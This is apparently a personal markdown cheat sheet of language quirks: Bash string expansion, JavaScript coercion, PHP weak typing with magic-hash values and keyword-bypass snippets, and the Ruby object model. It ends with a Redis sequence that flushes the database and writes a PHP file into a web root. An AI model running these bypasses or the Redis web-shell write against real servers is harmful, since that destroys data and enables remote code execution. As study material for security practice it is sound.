# Programming Trick

## Script Language

### Shell

#### String Manipulation
- [Bash Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion)

    | Parameter Expansion   | x="a1b1c2d2" |
    |:----------------------|:-------------|
    | `${x#*1}`             | `b1c2d2`     |
    | `${x##*1}`            | `c2d2`       |
    | `${x%1*}`             | `a1b`        |
    | `${x%%1*}`            | `a`          |
    | `${x/1/3}`            | `a3b1c2d2`   |
    | `${x//1/3}`           | `a3b3c2d2`   |
    | `${x//?1/z3}`         | `z3z3c2d2`   |
    | `${x:0:2}`            | `a1`         |

- sed
- awk

### JavaScript
- Weak Type (comparison `==`)
    - `[] == 0`
    - `['a', ['b', 'c']] == "a,b,c"`
    - `"b" + "a" + + "a" + "a" == "baNaNa"`
- Prototype Chain
    ```
    __proto__ 
    ─────────>
                                          
             ┌─────────────────────────────┐ ┌───────────────────────────────────────────────────┐
             │                             │ │                                                   │
             │                             │ │                                                   │
             │                             │ │                   ┌──────┐                        │
             │                             │ │                   │ null │                        │
             │                             │ │                   └──────┘                        │
             │                             │ │                      ↑                            │
             │                             ↓ ↓                      │                            │
    ┌────────────┐    prototype┌────────────────────┐    ┌──────────────────┐  constructor┌──────────┐
    │ Function() │─────────────│ Function.prototype │───>│ Object.prototype │─────────────│ Object() │
    └────────────┘constructor  └────────────────────┘    └──────────────────┘prototype    └──────────┘
                                            ↑                       ↑          
                                            │                       │
                                         ┌─────┐    prototype┌─────────────┐
                                         │ A() │─────────────│ A.prototype │
                                         └─────┘constructor  └─────────────┘
                                                                    ↑          
                                                                    │
                                                               ┌─────────┐
                                                               │ new A() │
                                                               └─────────┘
    ```

#### Reference
- [wtfjs](https://github.com/denysdovhan/wtfjs)
- [JavaScript Truth Table](https://thomas-yang.me/projects/oh-my-dear-js/)
- [你懂 JavaScript 嗎？#8 強制轉型（Coercion）](https://ithelp.ithome.com.tw/articles/10201512)


### PHP
- Weak Type (comparison `==`)
    - [PHP Truth Table](https://www.php.net/manual/en/types.comparisons.php)
    - [String to Number Comparison](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.core.string-number-comparision)
    - `0eXXXX == 0eYYYY`
        - `md5(240610708) = 0e462097431906509019562988736854`
        - `md5(314282422) = 0e990995504821699494520356953734`
        - `md5(QLTHNDT) = 0e405967825401955372549139051580`
    - PHP Array
        - `$arr[idx] <-> $arr{idx}`
        - `strcmp([], []) -> NULL`
        - `md5([]) -> NULL`
        - `sha1([ ]) -> NULL`
        - `strlen([ ]) -> NULL`
        - `file_put_contents("info.php", ["<?php ", "phpinfo();"]);`
- Keyword Bypass
    - Case Insensitive
        - `<?php SySTeM("ls -al"); ?>`
    - Variable Function
        - `$func="system"; $func("ls -al");`
    - `system(id) -> system("id")`
    - ``echo `id` -> system("id")``
- [Tags](https://www.php.net/manual/en/language.basic-syntax.phptags.php)
    - normal tag

        ```
        <?php echo 'test' ?>
        ```

    - short tag

        > can be disabled via the `short_open_tag` in `php.ini`, or are disabled
        > by default if PHP is built with the `--disable-short-tags` configuration

        ```php
        <? echo 'test' ?>
        ```

    - short echo tag

        ```php
        <?= 'test' ?>
        ```

#### Reference
- [php.net](https://www.php.net/)


### Python

#### Reference
- [wtfpython](https://github.com/satwikkansal/wtfpython) 


### Ruby
- Object Model
    ```
    superclass
    ──────────>

          ┌──────────────────────────────────────────────────────────┐
          │                                                          │
          │                       ┌─────┐                            │
          │                       │ nil │                            │
          │                       └─────┘                            │
          │                          ↑                               │
          │                          │                               │
          │                   ┌─────────────┐  singleton_class┌──────────────┐ 
          │                   │ BasicObject │─────────────────│ #BasicObject │
          │                   └─────────────┘                 └──────────────┘
          │                          ↑                               ↑
          ↓                          │                               │
    ┌───────┐    ┌────────┐    ┌────────┐      singleton_class┌─────────┐
    │ Class │───>│ Module │───>│ Object │─────────────────────│ #Object │
    └───────┘    └────────┘    └────────┘                     └─────────┘
                                     ↑                               ↑ 
                                     │                               │
                              class┌───┐            singleton_class┌────┐
              ┌────────────────────│ A │───────────────────────────│ #A │
              │                    └───┘                           └────┘
              │                      ↑  
              │                      │  
            ┌───┐   singleton_class┌────┐
            │ a │──────────────────│ #a │
            └───┘                  └────┘

    ```

## Database

### Redis
- Write file

    ```
    FLUSHALL
    SET payload "<?php phpinfo() ?>"
    CONFIG SET DIR /var/www/html/
    CONFIG SET DBFILENAME shell.php
    SAVE
    ```

- [RCE](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

